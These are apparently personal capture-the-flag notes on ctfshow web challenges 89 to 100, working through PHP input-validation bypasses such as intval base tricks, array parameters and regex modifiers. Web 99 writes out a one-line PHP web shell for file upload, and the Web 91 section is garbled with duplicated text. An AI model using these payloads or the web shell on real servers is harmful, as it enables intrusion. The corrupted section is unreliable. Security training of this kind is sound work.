# Web 89
![[Pasted image 20241124205753.png]]

## Observation
(Identify and clearly define the problem.)
- This code is waiting for a number, `num`.
- The string of number held by `num` can't include `[0-9]`.
- However, [[#`intval()`]] ensure that `num` holds an integer.

## Research
(Gather data and understand the context.)
### `intval()`
**`intval()`** is a built-in **PHP function** that **converts a variable to an integer value**. It is commonly used to ensure that a variable holds an integer, especially when dealing with user input or data that might be of mixed types.

---

#### **Syntax**

```php
int intval ( mixed $var [, int $base = 10 ] )
```

- **`$var`**: The variable you want to convert to an integer.
- **`$base`** (optional): The numerical base for the conversion. The default base is 10. This parameter is only applicable if `$var` is a string.

#### **Description**

- **Purpose**: To get the integer value of a variable.
- **Type Casting**: It behaves similarly to type casting `(int)$var`, but with some differences, especially regarding the handling of strings and bases.
- **Usage Scenarios**:
    - Sanitizing user input.
    - Performing mathematical operations where an integer is required.
    - Ensuring type consistency.

#### **Behavior**

- **Strings**: If `$var` is a string, `intval()` will extract the integer value from the beginning of the string. If the string does not contain a numeric value at the start, the result will be `0`.
    
    ```php
    intval("42 apples"); // Returns 42
    intval("   42");     // Returns 42
    intval("abc42");     // Returns 0
    ```
    
- **Floats**: When converting a float to an integer, `intval()` will truncate the decimal part.
    
    ```php
    intval(42.99); // Returns 42
    ```
    
- **Booleans**:
    
    ```php
    intval(true);  // Returns 1
    intval(false); // Returns 0
    ```
    
- **Arrays and Objects**: When applied to arrays or objects, `intval()` will return `1` for non-empty arrays or objects and `0` for empty ones.
    
    ```php
    intval([]);          // Returns 0
    intval([1, 2, 3]);   // Returns 1
    intval(new stdClass); // Returns 1
    ```
    
- **NULL Values**:
    
    ```php
    intval(null); // Returns 0
    ```
    

#### **Parameters**

1. **`$var`**:
    
    - **Type**: Mixed.
    - **Description**: The variable you wish to convert to an integer.
2. **`$base`** (optional):
    
    - **Type**: Integer.
    - **Description**: The base for the conversion. Valid values are between 2 and 36.
    - **Note**: The `$base` parameter only affects the conversion when `$var` is a string. It specifies the base of the number in the string.
    
    ```php
    intval('0x1A', 16); // Returns 26
    intval('1A', 16);   // Returns 26
    intval('1101', 2);  // Returns 13
    ```
==When the `$base` is 0, the function will detect the `$var` 's base.==
- `0x` means `$var` is 16.
- `0` means `$var` is 8.
-  The other means `$var` is 10.

#### **Return Values**

- **Integer**: The integer value of `$var` after conversion.

#### **Examples**

**Example 1: Basic Usage**

```php
$number = "12345";
echo intval($number); // Outputs: 12345
```

**Example 2: With Non-Numeric Strings**

```php
$number = "123abc";
echo intval($number); // Outputs: 123

$number = "abc123";
echo intval($number); // Outputs: 0
```

**Example 3: Using Base Parameter**

```php
$hexNumber = "1A";
echo intval($hexNumber, 16); // Outputs: 26

$binaryNumber = "1101";
echo intval($binaryNumber, 2); // Outputs: 13
```

**Example 4: Converting Floats**

```php
$floatNumber = 3.14159;
echo intval($floatNumber); // Outputs: 3
```

**Example 5: Handling Booleans and NULL**

```php
echo intval(true);    // Outputs: 1
echo intval(false);   // Outputs: 0
echo intval(null);    // Outputs: 0
```

#### **Differences Between `intval()` and Type Casting**

While `intval()` and `(int)` casting often produce the same result, there are some subtle differences, particularly when dealing with strings and the base parameter.

```php
$var = "042";
echo intval($var);      // Outputs: 42
echo (int)$var;         // Outputs: 42

echo intval($var, 8);   // Outputs: 34 (interpreted as octal)
```

#### **Use Cases**

- **Data Validation**: Ensuring that variables expected to be integers are indeed integers.
- **User Input**: Sanitizing form inputs, query parameters, or any external data before processing.
- **Mathematical Operations**: Preparing variables for calculations that require integer operands.

#### **Best Practices**

- **Check Input Types**: Always validate and sanitize external inputs before using them.
- **Specify Base When Necessary**: If you are working with numbers in bases other than 10, make sure to specify the correct base.
- **Be Aware of Leading Zeros**: Strings with leading zeros might be interpreted differently when a base is specified.

#### **Common Pitfalls**

- **Non-Numeric Strings**: If the string does not start with a numeric value, `intval()` will return `0`.
    
    ```php
    intval("abc"); // Returns 0
    ```
    
- **Floating-Point Precision**: When dealing with very large floating-point numbers, precision might be lost during conversion.
    
    ```php
    $largeFloat = 1.0e+20;
    echo intval($largeFloat); // May not produce expected result due to precision limits
    ```
    

#### **Related Functions**

- **`floatval()`**: Converts a variable to a float.
- **`boolval()`**: Converts a variable to a boolean.
- **`strval()`**: Converts a variable to a string.
- **`is_int()`**: Checks if a variable is of type integer.
- **Type Casting**: `(int)$var` or `(integer)$var` casts a variable to integer.

#### **References**

- **PHP Manual - `intval()` Function**: [https://www.php.net/manual/en/function.intval.php](https://www.php.net/manual/en/function.intval.php)

---

**Summary**

- **`intval()`** is a PHP function used to convert variables to integer values.
- It handles different data types (strings, floats, booleans, etc.) and provides an optional base parameter for numerical strings.
- Useful for data validation, sanitization, and ensuring type consistency in mathematical operations.

### `preg_match()`
**`preg_match()`** is a built-in **PHP function** that performs a regular expression match on a given string. It searches a string for a pattern defined by a regular expression and returns whether or not a match was found, along with the matches themselves if desired.

---

#### **Syntax**

```php
int preg_match ( string $pattern , string $subject , array &$matches = null , int $flags = 0 , int $offset = 0 )
```

- **`$pattern`**: The regular expression pattern to search for.
- **`$subject`**: The input string to search in.
- **`$matches`** (optional): An array where the results of the search will be stored.
- **`$flags`** (optional): Modifiers that change the behavior of the function.
- **`$offset`** (optional): The position in the subject to start searching from.

#### **Description**

- **Purpose**: To perform pattern matching using regular expressions.
- **Functionality**:
    - Determines if a pattern exists within a string.
    - Can extract parts of the string that match the pattern.
- **Use Cases**:
    - Validating input formats (emails, phone numbers, etc.).
    - Extracting substrings based on patterns.
    - Searching and replacing text.

#### **Parameters**

1. **`$pattern`**:
    
    - **Type**: String.
        
    - **Description**: The regular expression pattern, enclosed within delimiters (usually `/`), and optional modifiers (e.g., `i` for case-insensitive).
        
        ```php
        $pattern = '/^[a-z]+$/i';
        ```
        
2. **`$subject`**:
    
    - **Type**: String.
    - **Description**: The input string to search for the pattern.
3. **`&$matches`** (optional):
    
    - **Type**: Array.
    - **Description**: If provided, this array will contain the results of the search.
        - **`$matches[0]`**: The full match.
        - **`$matches[1]`, `$matches[2]`, ...**: Subpattern matches.
4. **`$flags`** (optional):
    
    - **Type**: Integer.
    - **Description**: Flags that modify the behavior.
        - **`PREG_OFFSET_CAPTURE`**: Returns the offset of the match.
        - **`PREG_UNMATCHED_AS_NULL`** (PHP 7.2+): Unmatched subpatterns are reported as `null`.
5. **`$offset`** (optional):
    
    - **Type**: Integer.
    - **Description**: The starting position for the search in the subject string.

#### **Return Values**

- **Type**: Integer.
- **Possible Values**:
    - **`1`**: If the pattern matches the subject.
    - **`0`**: If the pattern does not match.
    - **`FALSE`**: If an error occurred.

#### **Examples**

##### **Example 1: Basic Usage**

```php
$pattern = '/php/i';
$subject = 'I love PHP!';
if (preg_match($pattern, $subject)) {
    echo 'Match found!';
} else {
    echo 'No match found.';
}
// Output: Match found!
```

##### **Example 2: Extracting Matches**

```php
$pattern = '/(\d{4})-(\d{2})-(\d{2})/';
$subject = 'Today is 2023-10-05.';
if (preg_match($pattern, $subject, $matches)) {
    echo "Year: " . $matches[1]; // Outputs: Year: 2023
    echo "Month: " . $matches[2]; // Outputs: Month: 10
    echo "Day: " . $matches[3];   // Outputs: Day: 05
}
```

##### **Example 3: Using Flags**

```php
$pattern = '/world/';
$subject = 'Hello world!';
if (preg_match($pattern, $subject, $matches, PREG_OFFSET_CAPTURE)) {
    print_r($matches);
}
/*
Output:
Array
(
    [0] => Array
        (
            [0] => world
            [1] => 6
        )
)
*/
```

##### **Example 4: Starting Search from an Offset**

```php
$pattern = '/a/';
$subject = 'Banana';
if (preg_match($pattern, $subject, $matches, 0, 3)) {
    echo 'Match found at position ' . $matches[0];
} else {
    echo 'No match found.';
}
// Output: Match found at position a
```

#### **Common Use Cases**

- **Email Validation**
    
    ```php
    $email = 'user@example.com';
    if (preg_match('/^[\w\-\.]+@([\w\-]+\.)+[\w\-]{2,4}$/', $email)) {
        echo 'Valid email address.';
    } else {
        echo 'Invalid email address.';
    }
    ```
    
- **Password Strength Check**
    
    ```php
    $password = 'Passw0rd!';
    if (preg_match('/^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/', $password)) {
        echo 'Strong password.';
    } else {
        echo 'Weak password.';
    }
    ```
    
- **Extracting URLs from Text**
    
    ```php
    $text = 'Visit https://www.example.com or http://test.com.';
    $pattern = '/https?:\/\/[\w\-\.]+\.\w+/i';
    if (preg_match_all($pattern, $text, $matches)) {
        print_r($matches[0]);
    }
    /*
    Output:
    Array
    (
        [0] => https://www.example.com
        [1] => http://test.com
    )
    */
    ```
    

#### **Modifiers in Patterns**

- **`i`**: Case-insensitive matching.
    
- **`m`**: Multiline mode.
    
- **`s`**: Dot matches newline.
    
- **`x`**: Allows whitespace and comments in the pattern for readability.
    
- **`u`**: Enables UTF-8 mode for Unicode matching.
    
    ```php
    $pattern = '/pattern/i'; // Case-insensitive
    ```
    

#### **Best Practices**

- **Escape Special Characters**: Use `preg_quote()` to escape user input that will be used in patterns.
    
    ```php
    $userInput = 'Hello. How are you?';
    $safeInput = preg_quote($userInput, '/');
    $pattern = '/' . $safeInput . '/';
    ```
    
- **Validate Patterns**: Ensure that the regular expressions are properly formed to avoid errors.
    
- **Use Anchors When Necessary**: Use `^` and `$` to match the beginning and end of the string.
    
    ```php
    $pattern = '/^hello$/'; // Matches exact string 'hello'
    ```
    
- **Performance Considerations**: Complex regular expressions can be resource-intensive. Optimize patterns when possible.
    

#### **Common Pitfalls**

- **Not Checking Return Value**: Always check the return value of `preg_match()` for `FALSE` to handle errors.
    
    ```php
    if (preg_match($pattern, $subject) === FALSE) {
        // Handle error
    }
    ```
    
- **Greedy vs. Lazy Matching**: Be aware of greedy (`*`, `+`) vs. lazy (`*?`, `+?`) quantifiers.
    
    ```php
    $pattern = '/<.*>/';    // Greedy, matches '<tag>content</tag>'
    $pattern = '/<.*?>/';   // Lazy, matches '<tag>'
    ```
    
- **Misplaced Modifiers**: Modifiers should be placed after the delimiter, not inside the pattern.
    
    ```php
    $pattern = '/pattern/i'; // Correct
    $pattern = '/pattern/' . 'i'; // Incorrect
    ```
    

#### **Alternatives**

- **`preg_match_all()`**: Returns all matches in an array.
    
    ```php
    preg_match_all($pattern, $subject, $matches);
    ```
    
- **`preg_replace()`**: Performs a search and replace using regular expressions.
    
    ```php
    $result = preg_replace($pattern, $replacement, $subject);
    ```
    
- **`preg_split()`**: Splits a string by a regular expression.
    
    ```php
    $parts = preg_split($pattern, $subject);
    ```
    

#### **Error Handling**

- **Preg Error Codes**: Use `preg_last_error()` to check for errors if `preg_match()` returns `FALSE`.
    
    ```php
    if (preg_match($pattern, $subject) === FALSE) {
        $error = preg_last_error();
        // Handle error based on $error code
    }
    ```
    

#### **References**

- **PHP Manual - `preg_match()` Function**: [https://www.php.net/manual/en/function.preg-match.php](https://www.php.net/manual/en/function.preg-match.php)
- **PHP Regular Expressions**: [https://www.php.net/manual/en/book.pcre.php](https://www.php.net/manual/en/book.pcre.php)
- **Regular Expressions Tutorial**: [https://www.regular-expressions.info/](https://www.regular-expressions.info/)

---

#### **Summary**

- **`preg_match()`** is a PHP function used to perform regular expression matching on strings.
- It returns `1` if a match is found, `0` if not, and `FALSE` if an error occurs.
- The function can also return matched subpatterns if the `$matches` parameter is provided.
- Commonly used for input validation, parsing text, and extracting information from strings.
- Be mindful of pattern syntax, modifiers, and always handle possible errors.

---

**Note**: Regular expressions can be complex and powerful. It's important to test your patterns thoroughly to ensure they work as intended and do not introduce security vulnerabilities, especially when dealing with user input.
## Hypothesis
(Formulate a testable hypothesis or potential solution.)
- What if `num` is not a string?
	- `preg_match("/[0-9]/", $num)` will return $0$.
- If `num` is an array:
	- `intval()` will return `1` for non-empty arrays.
## Experimentation
(Design and conduct experiments to test the hypothesis.)
`{URL}/?num[]=7`
![[Pasted image 20241124213252.png]]
# Web 90
![[Pasted image 20241126200147.png]]
## Observation
(Identify and clearly define the problem.)
- The string of `num` in the `GET` method cannot be "4476".
- But we need to convert `num` to $4476$ whatever the base is. 
## Research
(Gather data and understand the context.)
![[#`intval()`#**Parameters**]]
## Hypothesis
(Formulate a testable hypothesis or potential solution.)
What if we give the `$num` as based-8 number, e.g. $0x$

We use `bc` (Basic  Calculator)[https://www.tecmint.com/bc-command-examples/]
```makefile
[root@centos6 ~]# bc
obase=16                                        #设置输出为16进制
ibase=2                                         #设置输入为2进制
1111111111111100011010                          #输入2进制数
3FFF1A                                          #转换为16进制
```

```Makefile
[root@centos6 ~]# bc                                  #打开bc计算器
bc 1.06.95
Copyright 2006 Free Software Foundation, Inc.
This is free software with ABSOLUTELY NO WARRANTY.
For details type `warranty'. 
88*123                                                #计算 88*123
10824                                                 #计算器输出结果
#
#
123+65*2-100                                          #计算123+65*2-100
153                                                   #计算器输出结果
```

## Experimentation
(Design and conduct experiments to test the hypothesis.)
![[Pasted image 20241126204839.png]]
![[Pasted image 20241126204741.png]]

# Web 91
![[Pasted image 20241127074629.png]]

## Observation
(Identify and clearly define the problem.)
- If the string, `cmd`, can match `/^php$/im`, we have more chance to get our flag.
- But the string, `cmd`, cannot match `/^php$/i`, because he will regard me as the hacker.


## Research
(Gather data and understand the context.)
### `i` Modifier (Case-Insensitive Matching):

- **Purpose:** Makes the pattern matching **case-insensitive**.
- **Effect:**
    - Without the `i` modifier, the pattern `^php$` would only match the exact lowercase string `"php"`.
    - With the `i` modifier, it will match `"php"`, `"PHP"`, `"Php"`, `"pHp"`, and any other combination of uppercase and lowercase letters.
- **Example:**
```PHP
$pattern = "/^php$/i";
$subject1 = "PHP";
$subject2 = "php";
$subject3 = "Php";

var_dump(preg_match($pattern, $subject1)); // int(1)
var_dump(preg_match($pattern, $subject2)); // int(1)
var_dump(preg_match($pattern, $subject3)); // int(1)
```
### `m` Modifier (Multi-Line Mode)
- **Purpose:** Alters the behavior of the `^` and `$` anchors to match the **start and end of each line** within a multi-line string, rather than just the start and end of the entire string.
    
- **Effect:**
    
    - Without the `m` modifier, `^php$` would only match if the entire string is exactly `"php"`.
    - With the `m` modifier, `^php$` can match `"php"` at the beginning and end of **any line** within a multi-line string.
```PHP
$pattern = m￼￼ Modifier (Multi-Line Mode)
- ￼￼Purpose:￼￼ Alters the behavior of the ￼￼^￼￼ and ￼￼$￼￼ anchors to match the ￼￼start and end of each line￼￼ within a multi-line string, rather than just the start and end of the entire string.
    
​￼- ￼￼Effect:￼￼
    
    - Without the ￼￼m￼￼ modifier, ￼￼^php$￼￼ would only match if the entire string is exactly ￼￼"php"￼￼.
    - With the ￼￼m￼￼ modifier, ￼￼^php$￼￼ can match ￼￼"php"￼￼ at the beginning and end of ￼￼any line￼￼ within a multi-line string.
￼￼PHP￼
$pattern = "/^php$/m";
$subject = "I love PHP.\nphp is great.\nLearning php!";

var_dump(preg_match_all($pattern, $subject, $matches)); 
// int(1) - Only "php is great." matches "^php$" in multi-line mode
￼￼

￼￼PHP￼
$pattern = "/^php$/";
$subject = "I love PHP.\nphp is great.\nLearning php!";

var_dump(preg_match_all($pattern, $subject, $matches)); 
// int(0) - No matches because "^php$" doesn't match the entire string

￼￼
​￼￼￼Hypothesis
(Formulate a testable hypothesis or potential solution.)
"/^php$/m";
$subject = "I love PHP.\nphp is great.\nLearning php!";

var_dump(preg_match_all($pattern, $subject, $matches)); 
// int(1) - Only "php is great." matches "^php$" in multi-line mode
```

```PHP
$pattern = "/^php$/";
$subject = "I love PHP.\nphp is great.\nLearning php!";

var_dump(preg_match_all($pattern, $subject, $matches)); 
// int(0) - No matches because "^php$" doesn't match the entire string

```
## Hypothesis
(Formulate a testable hypothesis or potential solution.)

- We need a return character `\n`.
- We give the `cmd` a string `flag\nphp` to avoid it.

It doesn't work.

So we need to rely on the tool: `hackbar`.
- First, ![[Pasted image 20241127150639.png]]
- Then, ![[Pasted image 20241127150703.png]]
- Next, ![[Pasted image 20241127150736.png]]
- At last, we can get this: ![[Pasted image 20241127150806.png]]
## Experimentation
(Design and conduct experiments to test the hypothesis.)

Done! ![[Pasted image 20241127150837.png]]

# Web 92
Easy~ Easy~
![[Pasted image 20241127154528.png]]

# Web 93
- We cannot use any English Characters.
- So binary, hex is not allowed.
- We use octal system:
![[Pasted image 20241128075310.png]]
Then do it.
![[Pasted image 20241128075331.png]]
# Web 94
![[Pasted image 20241129180701.png]]

## Observation
(Identify and clearly define the problem.)
- If `$num` is a string, `"4476"`, it won't pass.
- If `$num` has any character in `[a-z] or [A-Z]`, it won't pass.
- If `$num` makes the `strpos($num, "0")` to be `False`, it won't pass.
- If `$num` is pass the conditions below, and the number held by `$num` is still 4476, we'll get the flag.
## Research
(Gather data and understand the context.)
[`strpos()`](https://www.php.net/manual/en/function.strpos.php)
**Purpose:** To find the position of the first occurrence of a substring within a string.
## Hypothesis
(Formulate a testable hypothesis or potential solution.)
So we need the string in `$num` is not "4476", without `[a-z] or [A-Z]`, without '0'.
We can infer that our string can't be 
- `0b` or `0B` **Base 2 (binary)**
- `0x` or `0X` for **Base 16 (hexadecimal)**
- **Base 10 (decimal)**
- `0` (zero) or `0o` or `0O` for **Base 8 (octal)**
We could use float point, for example, $4476.0$, the `intval()` will convert the float number to integer.
## Experimentation
(Design and conduct experiments to test the hypothesis.)
![[Pasted image 20241129184850.png]]
Done!

# Web 95
![[Pasted image 20241202184356.png]]
## Observation
(Identify and clearly define the problem.)
- `$num` can't be 4476.
- `$num` can't include `[a-z] and [A-Z]` or be float number.
- `$num` must include '0'.
- `$num` need to be equal with 4476.
## Research
(Gather data and understand the context.)
![[Pasted image 20241202185635.png]]
If we use `+010574`, what will happen?
## Hypothesis
(Formulate a testable hypothesis or potential solution.)
```
?num=+010574

"+010574" === "4476" False

preg_match("/[a-z]/i", "+010574") False

!strpos("+010574", "0") False

intval("+010574", 0)==4476 True
```
## Experimentation
(Design and conduct experiments to test the hypothesis.)
![[Pasted image 20241202185729.png]]

# Web 96
![[Pasted image 20241202190149.png]]
Easy!
![[Pasted image 20241202190232.png]]
# Web 97
![[Pasted image 20241202205101.png]]

## Observation
(Identify and clearly define the problem.)
- The parameters, `a` and `b`, are necessary.
- `a` can't be equal with `b`.
- `md5(a) === md5(b)` need to be true.
## Research
(Gather data and understand the context.)
1. If we compare 2 arrays in PHP, we truly compare:
	1. values;
	2. order;
	3. types.
2. The function `md5()` will return `null` when fed with an array.

### Construct arrays in URL payload.
If you want to feed `a[]` with the values `2, 1` and `b[]` with the values `1, 2` in the URL, you can structure the URL as follows:

```
{URL}/?a[]=2&a[]=1&b[]=1&b[]=2
```

#### Explanation

1. **`a[]=2&a[]=1`**:
    
    - The parameter `a[]` is being passed twice: first with `2` and then with `1`. This means the value of `a[]` will be an array with two elements: `[2, 1]`.
2. **`b[]=1&b[]=2`**:
    
    - The parameter `b[]` is being passed twice: first with `1` and then with `2`. This means the value of `b[]` will be an array with two elements: `[1, 2]`.

#### Result in PHP

If you process this query string in PHP, for example, you would get:

```php
$_GET['a'] = [2, 1];  // The value of 'a' is an array with the elements 2 and 1.
$_GET['b'] = [1, 2];  // The value of 'b' is an array with the elements 1 and 2.
```

#### Summary:

- `a[]` will contain an array with `[2, 1]`.
- `b[]` will contain an array with `[1, 2]`.

This URL structure is commonly used to pass multiple values for the same parameter, and the server (or PHP in this case) will automatically interpret them as arrays.
## Hypothesis
(Formulate a testable hypothesis or potential solution.)
- `a=[2,1]`
- `b=[1,2]`
- the payload in `POST` method will be `a[]=2&a[]=1&b[]=1&b[]=2`
## Experimentation
(Design and conduct experiments to test the hypothesis.)
![[Pasted image 20241202214004.png]]
![[Pasted image 20241202214629.png]]

# Web 98
![[Pasted image 20241204152053.png]]

## Observation
(Identify and clearly define the problem.)
```
$_GET?$_GET=&$_POST:'flag';
```
It means if `$_GET` is given, the `$_GET` will be converted to the method, `$_POST`.

Only if `$_GET['HTTP_FLAG']=='flag'`, we can highlight the flag.
## Research
(Gather data and understand the context.)
[PHP ternary operator and if](https://www.php.cn/faq/383293.html)
The PHP code snippet you've provided:

```php
$_GET ? $_GET = &$_POST : 'flag';
```

is intended to perform a conditional operation based on the contents of the `$_GET` superglobal array. However, the syntax as written is somewhat unconventional and may lead to confusion. Let's break down what this code does, understand its components, and discuss its implications.

### **1. Understanding the Components**

#### **a. Ternary Operator (`? :`)**

The ternary operator in PHP is a shorthand for an `if-else` statement. Its basic syntax is:

```php
condition ? expression_if_true : expression_if_false;
```

It evaluates the `condition`. If the condition is **true**, it executes `expression_if_true`; otherwise, it executes `expression_if_false`.

#### **b. Reference Assignment (`=&`)**

In PHP, the `&` symbol is used to create a reference to a variable. When you assign a variable by reference, both variables point to the same memory location. Thus, changing one will affect the other.

### **2. Analyzing the Given Code**

Let's reformat the code for better readability:

```php
$_GET ? ($_GET = &$_POST) : 'flag';
```

**Breakdown:**

- **Condition (`$_GET`):**
    
    - In PHP, when an array is evaluated in a boolean context, it returns **`true`** if it's not empty and **`false`** if it's empty.
    - Therefore, `$_GET` as a condition checks whether the `$_GET` array contains any parameters.
- **Expression if True (`$_GET = &$_POST`):**
    
    - This assigns `$_GET` by reference to `$_POST`.
    - After this assignment, `$_GET` and `$_POST` point to the **same array** in memory.
    - Any changes made to one will reflect in the other.
- **Expression if False (`'flag'`):**
    
    - If `$_GET` is empty, the expression simply evaluates to the string `'flag'`.
    - This part doesn't perform any assignment or have any side effects.

### **3. What Does This Code Do?**

- **When `$_GET` is Not Empty:**
    
    - The code assigns `$_GET` by reference to `$_POST`.
    - This means both `$_GET` and `$_POST` will reference the **same** array.
    - Any modification to `$_POST` will directly affect `$_GET`, and vice versa.
- **When `$_GET` is Empty:**
    
    - The code does nothing substantial; it merely evaluates to `'flag'`, which isn't assigned or used further.

### **4. Implications and Potential Issues**

#### **a. Security Risks**

- **Data Overlap:**
    
    - By making `$_GET` and `$_POST` reference the same array, you merge GET and POST data. This can lead to unexpected behavior and security vulnerabilities.
- **Input Manipulation:**
    
    - An attacker could manipulate both GET and POST parameters interchangeably, potentially bypassing input validation or accessing restricted data.
- **Masking Issues:**
    
    - Important distinctions between GET and POST data (such as data intended to be sent via forms versus URL parameters) are lost, making it harder to manage and secure data correctly.

#### **b. Code Maintainability**

- **Confusion:**
    - Future developers (or even yourself at a later time) might find this code confusing and hard to maintain, as it blurs the lines between different types of HTTP request data.

#### **c. Unexpected Behavior**

- **Functionality Breakage:**
    - Functions or parts of the application that expect `$_GET` and `$_POST` to be separate might behave unpredictably, leading to bugs or system failures.

### **5. Correct and Safe Practices**

If your intention is to merge GET and POST data for specific purposes, consider safer and more explicit methods. Here are some recommendations:

#### **a. Merging Arrays Without References**

Instead of assigning by reference, you can merge `$_GET` and `$_POST` into a new array:

```php
$merged = array_merge($_GET, $_POST);
```

- **Benefits:**
    - Keeps `$_GET` and `$_POST` separate.
    - Avoids unintended side effects.
    - Enhances code clarity and maintainability.

#### **b. Explicit Handling**

Handle GET and POST data separately, validating and processing each as needed:

```php
if (!empty($_GET)) {
    // Process GET data
}

if (!empty($_POST)) {
    // Process POST data
}
```

- **Benefits:**
    - Maintains clear boundaries between different types of data.
    - Facilitates better security and validation practices.

#### **c. Using Superglobal Wrappers**

Consider using functions or classes to encapsulate and manage input data more securely:

```php
function getInputData() {
    return array_merge($_GET, $_POST);
}

$inputData = getInputData();
// Now use $inputData safely
```

### **6. Conclusion**

The PHP code `$_GET ? $_GET = &$_POST : 'flag';` conditionally assigns the `$_GET` array by reference to `$_POST` if `$_GET` is not empty. This results in both superglobals pointing to the same array, which can introduce significant security risks, make the codebase harder to maintain, and lead to unpredictable behavior.

**Best Practices:**

- **Avoid merging superglobals by reference.**
- **Use explicit methods to handle and validate input data.**
- **Maintain clear boundaries between different types of HTTP request data.**
- **Prioritize code clarity and security over brevity or cleverness.**

If you have a specific use case or need further assistance on handling GET and POST data securely, feel free to provide more details!
## Hypothesis
(Formulate a testable hypothesis or potential solution.)
- If we directly use `/?HTTP_FLAG=flag`, `$_GET=&$_POST` will be executed.
	- It means that our `HTTP_FLAG` will be covered by the key-value pairs in `$_POST`.
- As if we cannot avoid the `$_GET=&$_POST`, we can fill `$_POST` with `HTTP_FLAG=flag`.
	- So that we can let `HTTP_FLAG=flag` go into `$_GET` array.
	- Then `highlight_file($flag)` works.
`{URL}/?HTTP_FLAG=whatever` and post data with `HTTP_FLAG=flag`
## Experimentation
(Design and conduct experiments to test the hypothesis.)
![[Pasted image 20241204153449.png]]
# Web 99
![[Pasted image 20241207085356.png]]
## Observation
An array, `$allow`, pushed with $887-36=851$ random numbers.
The parameter, `n`, is necessary.
The parameter `n` need to be in the array, `$allow`.
Then we can get the permission through a one-sentence ==Trojan horse==
- Put the one-sentence Trojan horse from `$_POST['content']` into file whose called `$_GET['n']` in web server.
- Then we can execute anything through this file.
## Research
### One-sentence Trojan Horse
- Hackers can control the Web server with an extremely simple backdoor program on [[#WebShell]].
- One line.
- It can run command or code through web program executing environment such as PHP, ASP and JSP.
- This one-sentence Trojan Horse always appears in Web server script of dynamic language, such as PHP, ASP and JSP.
	- `eval()` of PHP;
	- `Execute()` of ASP;
	- `Runtime.exec()` of JSP.
- Then we can execute the command or code through **parameters of URL** or **parameters of POST**.
- e.g. `<?php @eval($_POST['cmd']); ?>`
	- get the parameter, `cmd`, to execute the PHP code.
### WebShell
- A script or program
- allows an attacker to gain remote control of a web server.
- It consists of a small script typically placed on a vulnerable web server.
## Hypothesis
- As the probability's perspective, $1$ has bigger probability than the other numbers in `$allow`, so that we assign `1.php` to `n`.
	- When comparing beginning, `1.php` will be regarded as $1$.
- `content` should be the one-sentence Trojan Horse. `<?php @eval($_POST['cmd']); ?>`
- Then we can use the [AntSword](https://www.yuque.com/antswordproject/antsword/srruro#) to run the hack command through `cmd`.
## Experiment
![[Pasted image 20241207111000.png]]

![[Pasted image 20241207111220.png]]
We can get the Directory Structure of the Web Server!
![[Pasted image 20241207111238.png]]
The flag we want is over there!
![[Pasted image 20241207111338.png]]
# Web 100
![[Pasted image 20241208100548.png]]
## Observation
- The flag is in class `ctfshow`.
- We need 3 necessary parameters `v1, v2, v3`.
- They are numeric.
- If we can satisfy the conditions, we can execute PHP code: `"$v2(ctfshow)$v3"`.
	- `$v3` has ';'.
	- `$v2` can't include ';'.
## Research
![[3-命令执行#`var_dump()`]]
## Hypothesis
We need to 